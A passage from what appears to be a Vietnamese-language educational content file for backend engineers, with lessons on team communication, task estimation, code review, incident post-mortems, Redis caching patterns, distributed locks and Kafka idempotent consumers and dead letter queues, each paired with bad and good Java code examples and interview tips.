        badCode: `"Anh ơi, code em bị lỗi 500 anh xem giúp em với!"
// Không log, không màn hình lỗi, không ngữ cảnh -> Senior phải bỏ dở việc để hỏi lại từ đầu!`,
        goodCodeTitle: '✅ Câu hỏi chuẩn kỹ sư giúp giải quyết vấn đề trong 2 phút',
        goodCode: `"Anh Nam ơi, em đang làm API checkout giỏ hàng (JIRA-204). Khi gọi saveOrder() thì bị DataIntegrityViolationException do cột user_id bị null.
Em đã debug thấy DTO đầu vào có user_id=12, nhưng sang Entity thì bị mất. Em đã kiểm tra mapping MapStruct nhưng chưa rõ tại sao trường này bị bỏ qua.
Khi nào anh tiện 5 phút, anh xem qua giúp em với ạ!"`,
        interviewTip: 'Trong phỏng vấn hành vi (Behavioral Interview), nếu được hỏi: "Khi gặp một vấn đề kỹ thuật khó mà em không biết giải quyết ra sao, em sẽ làm gì?", hãy trình bày chuẩn xác Quy tắc 15 phút và Công thức 4 phần này. Bạn sẽ thể hiện trọn vẹn sự chủ động (Proactiveness) và tính tôn trọng thời gian của đồng đội!'
      },
      {
        id: 'estimation-art',
        title: '2. Nghệ Thuật Estimate Task: Tại Sao Luôn Trễ Hạn & Công Thức Đệm Buffer',
        badge: 'Tránh Bị Đè Deadline',
        summary: 'Lập trình viên mới chỉ estimate thời gian gõ code (30%), quên mất 70% thời gian cho test, debug, code review và deploy.',
        explanation: `Lỗi kinh điển của Fresher:
Tech Lead hỏi: "Task này em làm mất bao lâu?"
Fresher nhẩm trong đầu: "Hàm này viết khoảng 4 tiếng là xong" -> Trả lời dõng dạc: "Dạ nửa ngày mai em xong ạ!"
Thực tế: Dính bug DB lạ mất nửa ngày, merge conflict mất 3 tiếng, Senior bắt sửa lại kiến trúc mất 1 ngày -> Tổng cộng mất 3 ngày mới merge được! Hậu quả: Bị đánh giá là thiếu năng lực và không đáng tin cậy.

**Quy luật Tảng Băng Chìm của phần mềm:**
- Thời gian gõ code thực tế chỉ chiếm **30%** tổng thời gian hoàn thành task!
- **70% còn lại** nằm ở:
  1. Đọc và hiểu code cũ / schema DB hiện tại (15%).
  2. Viết Unit Test và Mockito bao phủ các nhánh lỗi (20%).
  3. Tự test API trên Postman / Swagger và kiểm thử tích hợp (15%).
  4. Fix các comment góp ý trong quá trình Code Review (10%).
  5. Deploy lên môi trường Staging, hỗ trợ QA verify và xử lý merge conflict (10%).

👉 **Công thức vàng:** \`Estimate = (Thời gian code thuần túy) × 1.5 đến 2.0 (Buffer)\`!
Bàn giao trước hạn 2 tiếng luôn biến bạn thành "ngôi sao", còn trễ hạn nửa ngày sẽ khiến cả nhóm bị ảnh hưởng.`,
        badCodeTitle: '❌ Estimate ngây thơ chỉ tính lúc code thuận lợi',
        badCode: `// Nghĩ: "Viết CRUD User chỉ mất 2 tiếng" -> Báo cáo: "Chiều nay em xong!"
// Thực tế gặp lỗi Docker DB chết, conflict Git, QA trả vé -> Mất 2 ngày!`,
        goodCodeTitle: '✅ Phân rã task (WBS) và báo cáo có căn cứ',
        goodCode: `"Dạ task tạo đơn hàng này em ước tính mất 2 ngày:
- 0.5 ngày: Thiết kế DTO, Entity và viết migration Flyway.
- 0.5 ngày: Viết Service logic và tích hợp cổng thanh toán.
- 0.5 ngày: Viết Unit Test (Mockito) và MockMvc cho Controller.
- 0.5 ngày: Buffer dự phòng để giải quyết comment review và test cùng QA trên Staging."`,
        interviewTip: 'Khi phỏng vấn viên hỏi: "Nếu bạn nhận thấy một task chắc chắn sẽ bị trễ deadline, bạn sẽ làm gì?", hãy trả lời: "Em sẽ chủ động báo cáo với Tech Lead / PM ngay khi phát hiện nguy cơ (chậm nhất là buổi Daily Standup trước hạn), giải thích rõ nguyên nhân blocker và đề xuất giải pháp: giảm bớt phạm vi (descope) hoặc xin thêm người hỗ trợ, tuyệt đối không im lặng đến phút chót mới thông báo".'
      },
      {
        id: 'code-review-culture',
        title: '3. Văn Hóa Code Review: Đọc PR Văn Minh & Biến Góp Ý Thành Bàn Đạp',
        badge: 'Nâng Tầm Đẳng Cấp',
        summary: 'Tách bạch cái tôi cá nhân khỏi dòng code, sử dụng Conventional Comments và coi mỗi đợt review là một lớp học 1-kèm-1 miễn phí.',
        explanation: `Code Review không phải là cuộc thi "bắt bẻ" hay thể hiện quyền lực, mà là cơ chế bảo hiểm chất lượng cho sản phẩm và là nơi các kỹ sư học hỏi lẫn nhau.

**1. Tâm thế của người nhận review (Reviewee):**
- **You are not your code (Bạn không phải là dòng code của bạn):** Khi Senior comment "Đoạn này viết thế này làm sập DB", họ đang bảo vệ hệ thống khỏi lỗi, chứ không hề có ý hạ thấp con người bạn.
- **Không tự ái, không tranh cãi đôi co:** Thay vì gõ "Nhưng em thấy code em vẫn chạy bình thường", hãy mở lòng lắng nghe: "Em chưa tính tới trường hợp concurrency này, cảm ơn anh đã chỉ ra, em sẽ sửa lại bằng Pessimistic Lock".

**2. Tiêu chuẩn Conventional Comments khi review code đồng nghiệp:**
- \`praise:\` Khen ngợi một đoạn code viết thông minh, sáng sủa.
- \`nitpick:\` Góp ý nhỏ về format, đặt tên biến (không bắt buộc sửa).
- \`suggestion:\` Đề xuất cách viết tối ưu hơn kèm code mẫu giải thích tại sao.
- \`issue:\` Chỉ ra lỗi logic hoặc bảo mật bắt buộc phải sửa trước khi merge.
- \`question:\` Đặt câu hỏi để hiểu rõ hơn dụng ý của tác giả.`,
        badCodeTitle: '❌ Tranh cãi thiếu xây dựng hoặc comment cộc lốc',
        badCode: `// Reviewer comment: "Code viết như thế này mà cũng viết à?"
// Tác giả phản bác: "Chạy được là được rồi, anh rảnh quá hay sao đi bắt bẻ tên biến!"
// -> Phá vỡ tinh thần đoàn kết, gây ức chế môi trường làm việc.`,
        goodCodeTitle: '✅ Trao đổi chuyên nghiệp dựa trên dữ liệu kỹ thuật',
        goodCode: `// Reviewer:
suggestion: "Đoạn này gọi findById trong vòng lặp dễ dính N+1 Query. Em thử dùng findAllById(ids) để gom thành 1 câu SQL xem sao nhé."
// Tác giả:
"Cảm ơn anh Nam! Em đã refactor lại dùng findAllById() và benchmark thấy số lượng query giảm từ 50 xuống 1. Em đã update tại commit fe45a1, nhờ anh review lại giúp em ạ!"`,
        interviewTip: 'Nhắc đến cụm từ "Conventional Comments" và nguyên tắc "Blameless collaboration" trong phỏng vấn sẽ chứng minh bạn là người có kỹ năng làm việc nhóm (Team Player) cực kỳ trưởng thành.'
      },
      {
        id: 'incident-postmortem',
        title: '4. Xử Lý Sự Cố Production & Văn Hóa Blameless Post-mortem',
        badge: 'Kỹ Năng Cao Cấp',
        summary: 'Quy tắc "Rollback First, Debug Later", không đổ lỗi cá nhân mà tập trung vá lỗ hổng quy trình hệ thống.',
        explanation: `Bất kỳ kỹ sư phần mềm nào, kể cả CTO hay Principal Engineer, đều đã từng ít nhất một lần làm sập Production. Điều phân biệt một kỹ sư giỏi với một tay mơ nằm ở **cách họ phản ứng khi sự cố xảy ra**:

**Quy trình 4 bước xử lý sự cố chuẩn Big Tech:**
1. **Phát hiện & Báo động (Detect & Alert):** Nhận diện lỗi qua Datadog, Grafana hoặc khách hàng khiêu nại. Lập tức thông báo vào kênh #incident-production để toàn team nắm thông tin.
2. **Hồi phục tức thì (Mitigate First - Rollback First):**
   - Không ngồi mò mẫm debug khi hệ thống đang cháy!
   - Ưu tiên số 1: **Revert PR hoặc Rollback phiên bản Docker** về bản ổn định trước đó trong vòng 2 phút.
   - Bật cờ tắt tính năng (Feature Flag) hoặc bật trang bảo trì tạm thời.
3. **Điều tra nguyên nhân gốc rễ (Root Cause Analysis - RCA):** Sau khi Production đã an toàn, kéo log, traceId và heap dump về máy local để tái hiện và phân tích nguyên nhân kỹ thuật.
4. **Họp Blameless Post-mortem (Mổ băng sự cố không đổ lỗi):**
   - **Tư duy cốt lõi:** Con người luôn có thể sơ suất. Nếu một Fresher có thể làm sập toàn bộ hệ thống chỉ bằng 1 câu lệnh, thì lỗi thuộc về **HỆ THỐNG VÀ QUY TRÌNH** (thiếu test tự động, thiếu bước review, thiếu phân quyền DB) chứ KHÔNG PHẢI lỗi của cá nhân bạn đó!
   - Đưa ra các Action Items cụ thể để lỗi này KHÔNG BAO GIỜ lặp lại trong tương lai.`,
        badCodeTitle: '❌ Phản ứng hoảng loạn và văn hóa chỉ trích đổ lỗi',
        badCode: `// Hệ thống sập -> Giấu nhẹm đi, cố gắng commit code sửa vội -> Gây lỗi kép!
// Cuộc họp sau sự cố: "Tại thằng Nam push code ẩu làm công ty mất tiền!" (Văn hóa độc hại)`,
        goodCodeTitle: '✅ Hành động chuẩn mực theo quy trình Incident Management',
        goodCode: `// 1. Thông báo ngay: "[INCIDENT P1] API Payment đang trả lỗi 500 với tỉ lệ 40% từ lúc 14:15"
// 2. Rollback bản build 1.4.2 về 1.4.1 trong 90 giây -> Lỗi hết ngay.
// 3. Post-mortem Action Item:
//    - Thêm Integration Test cho luồng hoàn tiền đặc biệt.
//    - Cấu hình Alert Prometheus nếu tỉ lệ lỗi 5xx vượt quá 1% trong 3 phút.`,
        interviewTip: 'Khi phỏng vấn viên hỏi: "Kể về một lần bạn gây ra lỗi hoặc thất bại trong dự án?", hãy áp dụng chính xác tư duy Post-mortem này: Thẳng thắn thừa nhận sự cố, mô tả cách bạn phối hợp xử lý bình tĩnh, và quan trọng nhất là bạn đã rút ra bài học gì và cài đặt cơ chế phòng ngừa nào để lỗi đó vĩnh viễn không tái diễn.'
      }
    ]
  },
  {
    id: 'caching-redis',
    title: 'Redis & Kiến Trúc Caching Cao Cấp',
    icon: '⚡',
    accentColor: '#f43f5e',
    tagline: 'Tăng tốc độ truy vấn gấp 100 lần, làm chủ Cache-Aside, phòng chống Cache Penetration/Avalanche và Distributed Lock',
    topics: [
      {
        id: 'cache-aside-pattern',
        title: '1. Chiến Lược Cache-Aside: Đọc Ghi Chuẩn & Vấn Nạn Đồng Bộ Dữ Liệu',
        badge: 'Mẫu Kiến Trúc Bắt Buộc',
        summary: 'Đọc: Cache trước -> Miss thì đọc DB -> Lưu Cache. Ghi: Cập nhật DB trước -> XÓA Cache (không UPDATE cache) để tránh Race Condition.',
        explanation: `Trong các hệ thống có lưu lượng truy cập lớn, Database thường là nút thắt cổ chai (bottleneck) đầu tiên bị quá tải. Caching bằng Redis là vũ khí số 1 để giải cứu DB.
Mẫu thiết kế phổ biến nhất là **Cache-Aside (Lazy Loading)**:

**1. Luồng đọc (Read Path):**
1. Client gửi request tìm thông tin sản phẩm có ID = 10.
2. Ứng dụng kiểm tra trong Redis Cache trước:
   - **Cache Hit:** Trả về dữ liệu ngay lập tức (thời gian chỉ từ 1-2 mili-giây).
   - **Cache Miss:** Đọc dữ liệu từ Database (chậm hơn, tốn 50-100ms).
3. Ứng dụng ghi dữ liệu vừa đọc vào Redis kèm thời gian sống (**TTL**, ví dụ 30 phút) để phục vụ các request tiếp theo.

**2. Luồng ghi (Write Path) - Cạm bẫy sống còn:**
Khi người dùng cập nhật giá sản phẩm:
- ❌ **Sai lầm 1: Cập nhật DB xong CẬP NHẬT luôn Cache.**
  Nếu có 2 luồng A và B cùng sửa sản phẩm: Luồng A ghi DB trước, Luồng B ghi DB sau. Nhưng vì độ trễ mạng, Luồng B lại ghi Cache trước, Luồng A ghi Cache sau ➔ Cache đang lưu dữ liệu cũ của Luồng A trong khi DB lưu dữ liệu mới của Luồng B! Dữ liệu bị sai lệch vĩnh viễn!
- ❌ **Sai lầm 2: XÓA Cache trước rồi mới CẬP NHẬT DB.**
  Luồng A xóa cache -> Chưa kịp ghi DB thì Luồng B vào đọc -> Thấy cache rỗng -> Đọc DB cũ -> Nạp lại DB cũ vào Cache -> Luồng A ghi DB mới xong ➔ Cache lại bị bẩn (Dirty Read)!
- ✅ **Quy chuẩn đúng:** **Cập nhật Database thành công TRƯỚC ➔ Sau đó XÓA Cache (Cache Invalidation)!** Lần đọc tiếp theo sẽ tự động kích hoạt Cache Miss và kéo dữ liệu mới nhất từ DB lên.`,
        asciiDiagram: `[LUỒNG ĐỌC: Cache-Aside]
Client ──(1. Get ID=10)──> Server
                             ├──(2. Check Redis)──> [Redis Hit? Có ➔ Trả ngay 1ms]
                             │
                             └──(3. Cache Miss)───> [PostgreSQL: SELECT *]
                                                       │
                                   (4. Lưu Redis + TTL)│
                                   <───────────────────┘

[LUỒNG GHI: Cập Nhật DB -> XÓA Cache]
Client ──(1. Update Price)──> Server
                                ├──(2. UPDATE Database)──> [PostgreSQL: Commit thành công]
                                │
                                └──(3. DEL Key)──────────> [Redis: Xóa sạch cache]`,
        badCodeTitle: '❌ Cập nhật cache trực tiếp hoặc xóa cache trước DB',
        badCode: `@Transactional
public void updateProductPrice(Long id, BigDecimal newPrice) {
    // ❌ XÓA CACHE TRƯỚC: Rất dễ bị luồng khác đọc DB cũ rồi nạp lại cache rác!
    redisTemplate.delete("product:" + id);
    
    Product p = productRepo.findById(id).orElseThrow();
    p.setPrice(newPrice);
    productRepo.save(p);
    
    // ❌ HOẶC CẬP NHẬT CACHE TRỰC TIẾP: Dễ dính Race Condition ngược thứ tự ghi!
    redisTemplate.opsForValue().set("product:" + id, p);
}`,
        goodCodeTitle: '✅ Ghi DB trước rồi XÓA Cache kết hợp TTL đệm',
        goodCode: `@Transactional
public void updateProductPrice(Long id, BigDecimal newPrice) {
    Product p = productRepo.findById(id).orElseThrow();
    p.setPrice(newPrice);
    productRepo.save(p); // 1. Ghi Database thành công

    // 2. XÓA Cache sau khi DB đã commit thành công:
    redisTemplate.delete("product:" + id);
}

public ProductDto getProduct(Long id) {
    String cacheKey = "product:" + id;
    // 1. Kiểm tra cache
    ProductDto cached = (ProductDto) redisTemplate.opsForValue().get(cacheKey);
    if (cached != null) {
        return cached;
    }
    // 2. Cache miss -> Đọc DB và nạp cache kèm TTL 10 phút:
    ProductDto dbData = productRepo.findById(id).map(ProductDto::fromEntity).orElseThrow();
    redisTemplate.opsForValue().set(cacheKey, dbData, Duration.ofMinutes(10));
    return dbData;
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Làm sao đảm bảo tính nhất quán giữa Cache và DB nếu lệnh xóa Redis bị lỗi mạng?", hãy trả lời: "1. Luôn đặt TTL (thời gian sống) cho mọi key cache để dữ liệu tự hết hạn sau vài phút. 2. Với hệ thống tài chính yêu cầu cao, dùng Transactional Outbox Pattern hoặc CDC (Debezium đọc WAL log của MySQL/Postgres) để bắn event xóa cache qua Kafka với cơ chế retry bảo đảm".'
      },
      {
        id: 'cache-stampede-penetration',
        title: '2. Tam Đại Thảm Họa Cache: Avalanche, Breakdown, Penetration & Giải Pháp',
        badge: 'Chuẩn Sống Còn Big Tech',
        summary: 'Avalanche (ngàn key cùng hết hạn) -> Jitter TTL; Breakdown (Hot Key hết hạn) -> Mutex Lock; Penetration (query ID rác) -> Bloom Filter.',
        explanation: `Trong các sự kiện Mega Sale (11/11, Black Friday), hệ thống Caching có thể sụp đổ theo 3 kịch bản kinh hoàng sau:

**1. Cache Avalanche (Tuyết lở Cache):**
- **Nguyên nhân:** Hàng chục ngàn key cache được cài đặt cùng một thời điểm hết hạn (ví dụ đều hết hạn vào lúc 00:00:00). Đúng lúc nửa đêm, toàn bộ key cùng biến mất một lúc!
- **Hậu quả:** Hàng triệu request đồng loạt lao thẳng xuống Database ➔ Database sập trong 3 giây.
- **Giải pháp:** Thêm số giây ngẫu nhiên (**Random Jitter**) vào TTL: \`TTL = Base_TTL (10 phút) + Random(0 đến 120 giây)\`. Các key sẽ hết hạn rải rác, không bao giờ cùng chết một lúc.

**2. Cache Breakdown (Hot Key sụp đổ):**
- **Nguyên nhân:** Một sản phẩm cực Hot (ví dụ iPhone 16 giá 10k) có hàng trăm ngàn lượt truy cập mỗi giây. Đúng khoảnh khắc key đó vừa hết hạn TTL:
- **Hậu quả:** 50,000 request cùng thấy Cache Miss và cùng lúc chạy câu query phức tạp xuống Database để tái tạo cache ➔ Sập DB!
- **Giải pháp:** Dùng **Mutex Lock (Khóa phân tán)**: Chỉ cho phép request ĐẦU TIÊN được quyền truy vấn DB và ghi cache; 49,999 request còn lại phải chờ 50ms rồi thử đọc lại từ Cache.

**3. Cache Penetration (Xuyên thủng Cache):**
- **Nguyên nhân:** Kẻ xấu cố tình tấn công bằng cách gửi hàng loạt request với ID không hề tồn tại trong hệ thống (ví dụ: \`id = -9999\` hoặc UUID ngẫu nhiên).
- **Hậu quả:** Cache miss ➔ Đọc DB cũng miss ➔ Không có dữ liệu để ghi vào Cache ➔ Lần request tiếp theo lại tiếp tục đập vào DB!
- **Giải pháp:**
  - **Cache Null Object:** Lưu giá trị rỗng/null vào Redis với TTL ngắn (1-2 phút).
  - **Bloom Filter:** Dùng cấu trúc dữ liệu Bloom Filter để kiểm tra trước xem ID đó có khả năng tồn tại hay không. Nếu Bloom Filter bảo "Không có" thì từ chối ngay lập tức mà không cần hỏi Cache lẫn DB!`,
        badCodeTitle: '❌ TTL cố định và không chặn query ID rác',
        badCode: `// ❌ Nguy cơ Avalanche: Tất cả key đều có TTL đúng 3600 giây!
redisTemplate.opsForValue().set(key, data, Duration.ofSeconds(3600));

// ❌ Nguy cơ Penetration: ID rỗng không lưu cache -> Tiếp tục để hacker đập DB!
User user = userRepo.findById(id).orElse(null);
if (user != null) {
    redisTemplate.opsForValue().set(key, user);
}`,
        goodCodeTitle: '✅ Jitter TTL và phòng vệ Cache Penetration toàn diện',
        goodCode: `// ✅ 1. Khắc phục Avalanche: Thêm Random Jitter vào TTL:
long baseSeconds = 1800; // 30 phút
long jitterSeconds = ThreadLocalRandom.current().nextLong(0, 300); // Thêm 0-5 phút ngẫu nhiên
redisTemplate.opsForValue().set(key, data, Duration.ofSeconds(baseSeconds + jitterSeconds));

// ✅ 2. Khắc phục Penetration: Cache Null Object với TTL ngắn (2 phút):
User user = userRepo.findById(id).orElse(null);
if (user != null) {
    redisTemplate.opsForValue().set(key, user, Duration.ofMinutes(30));
} else {
    // Lưu giá trị đặc biệt "NULL_MARKER" để chặn các request rác tiếp theo:
    redisTemplate.opsForValue().set(key, "NULL_MARKER", Duration.ofMinutes(2));
}`,
        interviewTip: 'Hãy giải thích rành mạch sự khác biệt: "Breakdown là 1 Hot Key duy nhất bị chết; Avalanche là hàng loạt key cùng chết một lúc; còn Penetration là query dữ liệu rác không hề tồn tại". Nêu được cả 3 kèm giải pháp Bloom Filter / Jitter TTL sẽ gây ấn tượng cực kỳ mạnh mẽ với Solution Architect!'
      },
      {
        id: 'redis-distributed-lock',
        title: '3. Khóa Phân Tán (Distributed Lock) Với Redisson & Chống Tranh Chấp',
        badge: 'Kiến Trúc Microservices',
        summary: 'synchronized trong Java chỉ khóa được 1 máy đơn lẻ. Khi scale 5 Pod Kubernetes, bắt buộc dùng Redisson Distributed Lock có Watchdog.',
        explanation: `Khi chạy ứng dụng ở máy local, bạn có thể dùng từ khóa \`synchronized\` hoặc \`ReentrantLock\` để ngăn ngừa Race Condition.
Tuy nhiên, khi lên môi trường Production, ứng dụng của bạn được nhân bản thành **5 hoặc 10 Pod (Instances)** chạy sau một Load Balancer:
- Luồng 1 ở Pod A và Luồng 2 ở Pod B chạy trên 2 máy chủ vật lý khác nhau, 2 JVM khác nhau hoàn toàn!
- Từ khóa \`synchronized\` chỉ có tác dụng trong nội bộ 1 JVM duy nhất ➔ Cả 2 Pod cùng lúc trừ kho hàng ➔ Gãy toàn bộ logic kinh doanh!

**Giải pháp: Redis Distributed Lock**
Tất cả các Pod cùng nhìn vào một máy chủ Redis tập trung để xin cấp quyền sở hữu tài nguyên:

**Cạm bẫy khi tự viết Lock bằng \`SETNX\`:**
- \`SETNX lock_key my_id EX 10\`: Khóa tự hết hạn sau 10 giây để tránh Deadlock nếu server bị crash.
- **Nguy cơ:** Nếu tác vụ xử lý mất 12 giây (do GC pause hoặc gọi ngân hàng bị lag) ➔ Lock bị nhả sớm trong khi tác vụ chưa chạy xong ➔ Pod khác nhảy vào làm loạn dữ liệu! Sau đó Pod 1 chạy xong lại xóa nhầm lock của Pod 2!

**Giải pháp chuẩn Big Tech: Thư viện Redisson & Cơ chế Watchdog**
- Redisson tự động khởi chạy một tiến trình ngầm (**Watchdog**).
- Khi bạn giữ lock, cứ sau mỗi 10 giây, Watchdog sẽ tự động gia hạn thời gian sống của lock thêm 30 giây (Lock Lease Renewal).
- Lock chỉ được giải phóng khi code chạy xong và gọi \`unlock()\`, hoặc khi tiến trình bị crash đột ngột (Watchdog chết ➔ lock tự hết hạn an toàn).`,
        badCodeTitle: '❌ Dùng synchronized trên hệ thống Microservices nhiều Pod',
        badCode: `@Service
public class OrderService {
    // ❌ VÔ DỤNG khi scale 2 Pod trên Kubernetes:
    // Pod 1 và Pod 2 có 2 JVM độc lập, không thể khóa nhau được!
    public synchronized void bookSeat(Long showtimeId, String seatNumber) {
        // ... logic đặt ghế bị trùng lặp khi 2 user gửi request vào 2 Pod khác nhau!
    }
}`,
        goodCodeTitle: '✅ Redisson Distributed Lock an toàn tuyệt đối đa máy chủ',
        goodCode: `@Service
@RequiredArgsConstructor
public class TicketBookingService {
    private final RedissonClient redissonClient;

    public void bookSeatDistributed(Long showtimeId, String seatNumber) {
        String lockKey = "lock:showtime:" + showtimeId + ":seat:" + seatNumber;
        RLock lock = redissonClient.getLock(lockKey);

        try {
            // Chờ tối đa 5 giây để lấy lock, nếu lấy được thì giữ lock (Watchdog tự động gia hạn)
            boolean isLocked = lock.tryLock(5, -1, TimeUnit.SECONDS);
            if (!isLocked) {
                throw new ConflictException("Ghế đang có người khác thanh toán, vui lòng chọn ghế khác!");
            }

            // Thực hiện nghiệp vụ kiểm tra và trừ vé an toàn trên toàn cụm server:
            processSeatReservation(showtimeId, seatNumber);

        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new SystemException("Bị gián đoạn trong lúc giữ khóa");
        } finally {
            // Luôn đảm bảo chỉ giải phóng lock nếu chính luồng này đang sở hữu nó:
            if (lock.isHeldByCurrentThread()) {
                lock.unlock();
            }
        }
    }
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Thuật toán Redlock là gì?", hãy trả lời: "Redlock là thuật toán do tác giả Redis đề xuất để đảm bảo độ tin cậy của Distributed Lock trên cụm Redis đa node (Cluster/Sentinel), yêu cầu lấy được lock trên đa số máy (N/2 + 1 node) để tránh trường hợp Master bị crash khi dữ liệu chưa kịp replicate sang Slave".'
      }
    ]
  },
  {
    id: 'kafka-event-driven',
    title: 'Kafka & Hệ Thống Hướng Sự Kiện (Event-Driven)',
    icon: '📨',
    accentColor: '#0ea5e9',
    tagline: 'Xử lý hàng triệu message/giây, kiến trúc decoupled microservices, Dead Letter Queue và Idempotent Consumer',
    topics: [
      {
        id: 'kafka-consumer-idempotency',
        title: '1. Idempotent Consumer: Xử Lý Message Trùng Lặp Chuẩn At-least-once Delivery',
        badge: 'Quy Tắc Vàng Kafka',
        summary: 'Kafka cam kết At-least-once khiến message có thể bị gửi lại nhiều lần. Consumer bắt buộc phải có tính Idempotent để không trừ tiền 2 lần.',
        explanation: `Trong hệ thống phân tán, sự cố mạng là điều chắc chắn sẽ xảy ra.
Kafka mặc định hoạt động theo mô hình **At-least-once Delivery (Giao hàng ít nhất một lần)**:

**Kịch bản sinh ra Message trùng lặp:**
1. Consumer nhận được message: \`{ event: "PAYMENT_CHARGED", orderId: 88, amount: 500k }\`.
2. Consumer trừ tiền tài khoản thành công và ghi sổ cái.
3. Consumer chuẩn bị gửi tín hiệu commit Offset về Kafka Broker thì mạng bị rớt hoặc tiến trình Consumer bị Restart đột ngột!
4. Kafka Broker không nhận được commit Offset, coi như message này chưa được xử lý xong.
5. Sau khi kết nối lại (Consumer Rebalance), Kafka gửi lại **chính xác message đó** cho Consumer một lần nữa!
6. Nếu Consumer không có tính chất **Idempotency (Tính bất biến)** ➔ Khách hàng bị trừ tiền lần 2!

**3 Cách hiện thực Idempotent Consumer:**
1. **Unique Constraint ở tầng Database:** Dùng cột \`transaction_id\` hoặc \`event_id\` làm khóa chính (\`PRIMARY KEY\`) trong bảng lịch sử giao dịch. Nếu bị gửi lại, lệnh \`INSERT\` sẽ ném ngoại lệ \`DuplicateKeyException\`, Consumer phát hiện và bỏ qua một cách an toàn.
2. **Idempotency Key với Redis \`SETNX\`:** Trước khi xử lý, dùng \`redis.setIfAbsent("event:" + eventId, "PROCESSING", 24, TimeUnit.HOURS)\`. Nếu trả về \`false\` tức là sự kiện này đã hoặc đang được xử lý bởi luồng khác.
3. **Optimistic Conditional Update:** Dùng câu lệnh SQL có điều kiện: \`UPDATE orders SET status = 'PAID' WHERE id = ? AND status = 'PENDING'\`. Nếu trạng thái đã là 'PAID' rồi thì số dòng cập nhật là 0 ➔ Không làm gì thêm.`,
        asciiDiagram: `[Kafka Topic: orders] ──(Message: EventID=E-901, OrderID=12)──> [Consumer Service]
                                                                        │
                                       ┌────────────────────────────────┴────────────────────────────────┐
                                       │ Kiểm tra: redis.setIfAbsent("evt:E-901", "DONE", 24h)           │
                                       └────────────────────────────────┬────────────────────────────────┘
                                                                        │
                                           ┌────────────────────────────┴────────────────────────────┐
                                           ▼                                                         ▼
                             [Kết quả: TRUE (Chưa từng xử lý)]                       [Kết quả: FALSE (Đã xử lý rồi)]
                                           │                                                         │
                             1. Trừ tiền & Cập nhật Database                                         1. Log Warning: "Duplicate Message"
                             2. Commit Offset lên Kafka ✅                                          2. Bỏ qua & Commit Offset ngay ✅
                                                                                                        (Khách hàng KHÔNG bị trừ tiền 2 lần!)`,
        badCodeTitle: '❌ Consumer xử lý ngây thơ gây trừ tiền lặp lại',
        badCode: `@KafkaListener(topics = "payment-events")
public void handlePayment(PaymentEvent event) {
    // ❌ KHÔNG KIỂM TRA IDEMPOTENCY:
    // Nếu mạng chập chờn broker gửi lại tin này -> Khách hàng bị trừ tiền lần 2!
    walletService.deductBalance(event.userId(), event.amount());
    orderService.markAsPaid(event.orderId());
}`,
        goodCodeTitle: '✅ Idempotent Consumer dựa trên Database Unique Constraint',
        goodCode: `@Service
@RequiredArgsConstructor
@Slf4j
public class SafePaymentConsumer {
    private final ProcessedEventRepository eventRepo;
    private final WalletService walletService;

    @KafkaListener(topics = "payment-events", groupId = "wallet-group")
    @Transactional
    public void handlePaymentSafe(ConsumerRecord<String, PaymentEvent> record) {
        PaymentEvent event = record.value();
        String eventId = event.eventId();

        // 1. Kiểm tra bảng sự kiện đã xử lý (hoặc dùng INSERT IGNORE / ON CONFLICT DO NOTHING):
        if (eventRepo.existsById(eventId)) {
            log.warn("Phát hiện message trùng lặp đã xử lý trước đó | eventId={}", eventId);
            return; // Bỏ qua an toàn mà không trừ tiền lần nữa
        }

        // 2. Thực hiện trừ tiền nghiệp vụ:
        walletService.deductBalance(event.userId(), event.amount());

        // 3. Đánh dấu event đã xử lý trong cùng 1 Transaction:
        eventRepo.save(new ProcessedEvent(eventId, "WALLET_DEDUCTED", Instant.now()));
    }
}`,
        interviewTip: 'Hãy phân biệt rõ: "Kafka có tính năng Exactly-once Semantics (EOS) qua Transaction Coordinator, nhưng nó chỉ có hiệu lực trong phạm vi Kafka-to-Kafka (đọc từ Kafka topic A rồi ghi sang Kafka topic B). Khi Consumer tương tác với Database ngoài hoặc gọi bên thứ 3 (Email, SMS), bắt buộc phải xử lý Idempotency ở tầng ứng dụng".'
      },
      {
        id: 'kafka-dlq-poison-pill',
        title: '2. Xử Lý Poison Message & Chiến Lược Dead Letter Queue (DLQ)',
        badge: 'Phòng Vệ Treo Hệ Thống',
        summary: 'Message hỏng format (Poison Pill) khiến Consumer văng Exception liên tục và kẹt cứng Offset. Dùng DeadLetterPublishingRecoverer để cách ly.',
        explanation: `Một trong những sự cố tồi tệ nhất khi vận hành Kafka là **Poison Pill (Viên thuốc độc)**:
- **Poison Pill là gì?** Là một message có cấu trúc dị dạng nằm trong topic (ví dụ: JSON bị cụt dòng, thiếu trường bắt buộc, hoặc sai định dạng ngày tháng).
- **Hậu quả thảm khốc:**
  1. Consumer đọc message hỏng ➔ Ném \`SerializationException\` hoặc \`NullPointerException\`.
  2. Vì có lỗi ném ra, Consumer **không thể commit Offset**.
  3. Lần poll tiếp theo, Consumer lại đọc đúng ngay vị trí Offset chưa commit đó!
  4. Lại ném lỗi ➔ Lại đọc lại ➔ Vòng lặp vô tận (Infinite Retry Loop)!
  5. **Toàn bộ Consumer trong nhóm bị nghẽn cứng tại message đó**, không thể đọc tiếp các message bình thường phía sau. **Consumer Lag** vọt lên hàng triệu tin nhắn!

**Giải pháp chuẩn Big Tech: Dead Letter Queue (DLQ / DLT)**
- Cấu hình cơ chế Retry thông minh có giới hạn: Thử lại 3 lần kèm khoảng thời gian chờ (Backoff: 1s, 2s, 4s).
- Nếu sau 3 lần vẫn lỗi: **Không được để sập Consumer!**
- Sử dụng \`DeadLetterPublishingRecoverer\` để tự động đóng gói message lỗi kèm thông tin Stack Trace và chuyển hướng (route) sang một topic cách ly riêng biệt: \`orders.DLT\`.
- Sau khi đẩy sang DLT thành công, Consumer commit Offset của message lỗi và tiếp tục xử lý mượt mà hàng ngàn message bình thường tiếp theo!
- Đội ngũ vận hành sẽ nhận cảnh báo qua Slack/PagerDuty để xem xét và replay lại message trong DLT sau khi đã sửa bug.`,
        badCodeTitle: '❌ Nuốt exception hoặc retry vô hạn làm nghẽn toàn bộ luồng',
        badCode: `@KafkaListener(topics = "orders")
public void listen(String message) {
    // ❌ CÁCH 1: Try-catch nuốt lỗi -> Mất sạch dữ liệu của khách, không ai biết!
    // ❌ CÁCH 2: Để exception văng tự do mà không cấu hình ErrorHandler -> Consumer bị đơ vĩnh viễn!
    OrderDto dto = objectMapper.readValue(message, OrderDto.class);
    process(dto);
}`,
